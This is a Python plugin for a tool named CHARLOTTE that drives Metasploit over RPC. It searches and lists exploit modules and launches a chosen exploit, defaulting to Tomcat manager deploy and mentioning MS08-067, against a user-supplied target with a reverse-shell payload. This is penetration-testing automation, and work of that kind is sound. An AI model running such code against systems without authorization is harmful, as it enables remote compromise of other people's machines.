# ******************************************************************************************
# metasploit_plugin.py
# CHARLOTTE plugin for interacting with the Metasploit RPC interface.
# Requires msfrpcd to be running with correct username and password.
# ******************************************************************************************

import os
from metasploit.msfrpc import MsfRpcClient
from pprint import pprint

# ==========================================================================================
# CLASS: MetasploitInterface
# Handles RPC connection and Metasploit interactions
# ==========================================================================================
class MetasploitInterface:
    def __init__(self, username='msf', password='msf', ssl=False, port=55553):
        try:
            self.client = MsfRpcClient(password, username=username, ssl=ssl, port=port)
            self.console = self.client.consoles.console()
            print("[+] Connected to Metasploit RPC.")
        except Exception as e:
            print(f"[!] Failed to connect to Metasploit RPC: {e}")
            self.client = None

    def search_module(self, keyword):
        if self.client:
            results = self.client.modules.search(keyword)
            return results
        return []

    def list_exploits(self):
        if self.client:
            return self.client.modules.exploits
        return []

    def run_exploit(self, exploit_path, payload="generic/shell_reverse_tcp", rhost="", lhost="127.0.0.1", lport="4444"):
        if self.client:
            exploit = self.client.modules.use('exploit', exploit_path)
            exploit['RHOSTS'] = rhost
            exploit['LHOST'] = lhost
            exploit['LPORT'] = lport
            exploit.execute(payload=payload)
            print(f"[+] Exploit {exploit_path} launched with {payload}")
        else:
            print("[!] Metasploit RPC client is not connected.")

# ==========================================================================================
# MAIN
# ==========================================================================================
if __name__ == "__main__":
    msf = MetasploitInterface()

    # Example usage
    print("\n[+] Available Exploits:")
    exploits = msf.list_exploits()
    for e in exploits[:10]:
        print(f" - {e}")

    print("\n[+] Search for 'tomcat':")
    pprint(msf.search_module("tomcat"))

    print("\n[+] Running example exploit (make sure Metasploit is configured):")
    
    # Prompting for exploit path and options
    prompt = "Which exploit would you like to run? (e.g., multi/http/tomcat_mgr_deploy): "
    exploit_path = input(prompt).strip()
    if not exploit_path:
        exploit_path = "multi/http/tomcat_mgr_deploy"
    
    prompt = "Enter RHOST (target IP): "
    rhost = input(prompt).strip()
    if not rhost:
        rhost = "127.0.0.1"
    
    prompt = "Enter LHOST (local IP for reverse shell): "
    lhost = input(prompt).strip()
    if not lhost:
        lhost = "127.0.0.1"
    
    prompt = "Enter LPORT (local port for reverse shell): "
    lport = input(prompt).strip()
    if not lport:
        lport = "4444"

    # Sanity checks
    if not msf.client:
        print("[!] Metasploit client is not connected. Cannot run exploit.")
        exit(1)
        
    if not exploit_path:
        print("[!] No exploit path provided. Cannot run exploit.")
        exit(1)

    print(f"[+] Running exploit: {exploit_path}")
    msf.run_exploit(exploit_path, rhost=rhost, lhost=lhost, lport=lport)

    # msf.run_exploit("windows/smb/ms08_067_netapi", rhost="192.168.1.105")
    # Uncomment the above line to run an exploit (ensure Metasploit is configured correctly)
    print("[*] Metasploit interaction complete.")
    print("[*] Remember to check the Metasploit console for detailed output.")